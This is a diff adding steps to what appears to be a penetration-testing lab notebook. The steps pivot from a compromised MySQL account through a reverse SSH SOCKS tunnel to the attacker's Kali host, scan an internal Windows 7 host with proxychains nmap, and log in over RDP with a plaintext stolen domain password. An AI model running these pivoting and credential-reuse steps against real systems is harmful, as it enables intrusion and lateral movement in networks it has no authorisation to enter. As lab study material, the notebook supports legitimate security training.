@@ -518,6 +518,92 @@ Value = '1'
 }
 Set-RemoteRegistryValue @remoteKeyParams -Credential $credObject
 
+```
+
+# Create a stable reverse tunnel
+```
+ssh-keygen
+/var/lib/mysql/.ssh/id_rsa
+
+from="10.11.1.250",command="echo 'This account can only be used for port
+forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBVu1YocyTb1VTj7tkgBdqpqU/YQoKSTEC3btRPoWDs8s4oCkYNU4nuehdUn8NFeBPSABqrPq7oBu20jJVD+BWdsXUVkTqCeQr4iz1owud1GsE7QbkHiWXmkNjLqzDTnJqL9Tp1cSdIx7Ekwc9ETtQlmAaR3YRA0Ryd2JR1Mv8edE43Fhh9LGVeW/97hI6DeYOvA3+bODxd9hkqwnOyDqB5RzMEcu6q98sysp31QbiJ17LH1Rr5fkdUUmVZtdwlByu8heB5UrDW1UJUa0GoHmh/nzwxD6+9eazK/XNGp6/pOPhd2zag99IMMtTkypx6mguFYy3mIgkI/h5C46xJTOUz/xQ2LwGb8+PWmBXHDcnbL85y4p1yyoUM5oBd+Fb6DThYnKmwVtvUb0VrEcN03JZ9QepkvdE84eUzqBdbWBjTzhgHTLFRJeMQM2sUt7vBcOB2XmuTk3md/O8V7wQuSgXDk8vyz4h/iSCu8UaLJx0CnJ5AdtIUeIBzgFWf1hJnWE= mysql@zora
+```
+
+## Dynamic port forwarding
+```
+ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@192.168.119.165
+```
+
+add to /etc/proxychains4.conf
+```
+socks4 127.0.0.1 1080
+```
+
+## Targeting Poultry
+```
+proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20
+PORT     STATE  SERVICE
+21/tcp   closed ftp
+22/tcp   closed ssh
+23/tcp   closed telnet
+25/tcp   closed smtp
+53/tcp   closed domain
+80/tcp   closed http
+110/tcp  closed pop3
+111/tcp  closed rpcbind
+135/tcp  open   msrpc
+139/tcp  open   netbios-ssn
+143/tcp  closed imap
+443/tcp  closed https
+445/tcp  open   microsoft-ds
+993/tcp  closed imaps
+995/tcp  closed pop3s
+1723/tcp closed pptp
+3306/tcp closed mysql
+3389/tcp open   ms-wbt-server
+5900/tcp closed vnc
+8080/tcp closed http-proxy
+```
+-sT TCP connect
+-Pn no ping
+
+port `3389` `ms-wbt-server` is the rdp server  
+
+login with the credential we have
+
+```
+proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard
+```
+/d: domain
+/u: user
+/v: server host
+
+let me try rdesktop first
+```
+proxychains rdesktop 10.5.5.20 -d sandbox -u alex -p 'Ndawc*nRoqkC+haZ' -g 1024x768 -r clipboard:PRIMARYCLIPBOARD
 
 ```
 
+```
+C:\Users\alex>systeminfo
+Host Name: POULTRY
+OS Name: Microsoft Windows 7 Professional
+OS Version: 6.1.7601 Service Pack 1 Build 7601
+...
+Registered Owner: poultryadmin
+...
+Domain: sandbox.local
+
+netstat -ano
+
+```
+nothing interesting for the opening port, Ports 49152 and above
+are the Windows default dynamic/ephemeral ports for establishing TCP connections and we
+don’t need to worry about them
+
+check if alex is in admin group
+```
+
+Global Group memberships *Domain Users
+```
+it is a regular domain user
